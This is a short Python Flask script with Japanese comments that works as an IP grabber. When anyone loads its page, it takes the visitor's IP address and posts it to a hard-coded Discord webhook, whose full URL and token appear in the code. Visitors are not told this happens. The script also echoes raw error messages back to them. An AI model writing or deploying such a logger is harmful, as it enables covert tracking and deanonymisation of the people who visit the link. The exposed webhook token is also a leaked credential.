from flask import Flask, request
import urllib.request
import json

app = Flask(__name__)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    url = "https://discord.com/api/webhooks/1539471302715510874/--KVUupUWfcZsuPN4SlLXh5u0dITZ6Kv8jMTRB__LRpYvgjqgVjqbgopukhy4VS6Jsdz"
    data = {"content": f"IPアドレス: {ip}"}
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    # エラーを隠さずにそのまま画面に表示させる
    try:
        with urllib.request.urlopen(req) as response:
            return "ok: " + response.read().decode('utf-8')
    except Exception as e:
        return f"エラー発生: {str(e)}"

if __name__ == '__main__':
    app.run()

